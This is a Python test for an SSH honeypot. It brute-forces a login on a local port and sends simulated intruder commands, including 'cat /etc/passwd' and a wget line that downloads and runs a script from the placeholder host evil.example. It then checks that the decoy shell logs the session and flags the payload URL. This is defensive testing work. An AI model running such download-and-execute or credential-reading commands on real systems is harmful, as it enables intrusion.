import asyncio, os, sys, tempfile
import asyncssh
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from nullbyte.db import DB
from nullbyte.honeypot import Honeypot


def test_honeypot_session():
    async def main():
        tmp = tempfile.mkdtemp()
        db = DB(os.path.join(tmp, "t.db"))
        msgs = []
        async def notify(m): msgs.append(m)
        hp = Honeypot(db, 22222, os.path.join(tmp, "key"), notify, lambda: True)
        await hp.start()
        # brute-force-ish: try twice so the "reject first sometimes" logic is exercised
        for attempt in range(15):
            try:
                conn = await asyncssh.connect("127.0.0.1", 22222, username="root", password=f"admin{attempt}",
                                              known_hosts=None, client_keys=None)
                break
            except asyncssh.PermissionDenied:
                continue
        async with conn:
            r = await conn.run("uname -a; whoami", check=False)
            assert "prod-db-02" in r.stdout and "root" in r.stdout
            proc = await conn.create_process(term_type="xterm")
            proc.stdin.write("cat /etc/passwd\n")
            proc.stdin.write("cd /tmp && wget http://evil.example/x.sh -O x.sh; chmod +x x.sh; ./x.sh\n")
            proc.stdin.write("ls -la /root\n")
            proc.stdin.write("exit\n")
            out = await asyncio.wait_for(proc.stdout.read(), 10)
            assert "Welcome to Ubuntu" in out and "www-data" in out and "notes.txt" in out
            assert "Permission denied" in out
        await asyncio.sleep(0.5)
        await hp.stop()
        st = hp.stats()
        assert st["sessions"] == 2 and st["urls"] >= 1 and st["commands"] >= 4
        sess, cmds = hp.transcript(2)
        assert sess["username"] == "root" and any("wget" in c["cmd"] for c in cmds)
        assert hp.kiddie_of_the_day() in (1, 2)
        assert any("INTRUDER" in m for m in msgs) and any("payload URL" in m for m in msgs)
        print("\n".join(msgs[:3]))
        print(st)
    asyncio.run(main())
